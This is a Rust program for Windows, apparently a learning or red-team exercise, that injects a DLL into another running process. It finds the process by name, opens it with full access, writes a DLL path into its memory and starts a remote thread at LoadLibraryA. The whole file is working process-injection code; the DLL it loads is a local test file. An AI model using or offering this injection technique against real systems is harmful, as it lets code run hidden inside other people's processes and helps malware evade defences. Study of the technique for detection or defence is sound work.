use std::{ffi::CStr, os::windows::process, thread};
use winapi::{
    ctypes::c_void,
    shared::{minwindef::BOOL, ntdef::NULL},
    um::{
        errhandlingapi::GetLastError, libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA}, memoryapi::{VirtualAllocEx, WriteProcessMemory}, minwinbase::SECURITY_ATTRIBUTES, processthreadsapi::{CreateRemoteThread, OpenProcess}, synchapi::WaitForSingleObject, tlhelp32::{
            CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next,
            TH32CS_SNAPPROCESS,
        }, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_ALL_ACCESS}
    },
};

fn get_remote_process_handle(
    process_name: &str,
    process_id: &mut u32,
    process_handle: &mut *const c_void,
) -> bool {
    unsafe {
        let mut proc: PROCESSENTRY32 = std::mem::zeroed();

        proc.dwSize = size_of::<PROCESSENTRY32>() as u32;

        let snapshot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if snapshot_handle.is_null() {
            println!("[-] CreateToolhelp32Snapshot failed: {}", GetLastError());
            return false;
        }

        let status: BOOL = Process32First(snapshot_handle, &mut proc);

        if status == 0 {
            println!("[-] Process32First failed: {}", GetLastError());
            return false;
        }

        loop {
            let proc_name = CStr::from_ptr(proc.szExeFile.as_ptr()).to_str().unwrap();
            if proc_name.to_lowercase() == process_name.to_lowercase() {
                *process_id = proc.th32ProcessID;
                *process_handle = OpenProcess(PROCESS_ALL_ACCESS, 1, proc.th32ProcessID);
                if process_handle.is_null() {
                    println!("[-] OpenProcess failed: {}", GetLastError());
                    return false;
                }
                break;
            }

            if Process32Next(snapshot_handle, &mut proc) == 0 {
                break;
            }
        }

        if *process_handle == NULL {
            return false;
        }
    }

    return true;
}

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() != 2 {
        println!("Usage: {} <process_name>", args[0]);
        return;
    }
    let process_name = args.get(1).unwrap();

    let mut process_id: u32 = 0;
    let mut process_handle: *const c_void = std::ptr::null();

    if get_remote_process_handle(process_name, &mut process_id, &mut process_handle) {
        println!(
            "[+] Found process: {} with PID: {}",
            process_name, process_id
        );
    } else {
        println!("[-] Failed to find process: {}", process_name);
    }

    unsafe {
        let dll_name = "C:\\Users\\admin\\Rust\\Projects\\Hello-DLL\\target\\debug\\Hello.dll\0";

        let ploadlibrary = GetProcAddress(
            GetModuleHandleA("Kernel32.dll\0".as_ptr() as *const i8),
            "LoadLibraryA\0".as_ptr() as *const i8,
        );
        if ploadlibrary.is_null() {
            println!("[-] GetProcAddress failed: {}", GetLastError());
            return;
        }

        let paddress = VirtualAllocEx(
            process_handle as *mut c_void,
            std::ptr::null_mut(),
            dll_name.len() + 1,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if paddress.is_null() {
            println!("[-] VirtualAllocEx failed: {}", GetLastError());
            return;
        }

        println!("[+] Allocated memory at address: {:p}", paddress);


        let mut bytes_written: usize = 0;

        let status = WriteProcessMemory(
            process_handle as *mut c_void,
            paddress as *mut c_void,
            dll_name.as_ptr() as *const c_void,
            dll_name.len() + 1,
            &mut bytes_written,
        );

        if status == 0 {
            println!("[-] WriteProcessMemory failed: {}", GetLastError());
            return;
        }

        let mut thread_id = 0;

        let thread_handle = CreateRemoteThread(
            process_handle as *mut c_void,
            std::ptr::null_mut(),
            0,
            Some(std::mem::transmute::<*mut c_void, unsafe extern "system" fn(*mut c_void) -> u32>(ploadlibrary as *mut c_void)),
            paddress as *mut c_void,
            0,
            &mut thread_id,
        );

        if thread_handle.is_null() {
            println!("[-] CreateRemoteThread failed: {}", GetLastError());
            return;
        }

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
        
    }
}
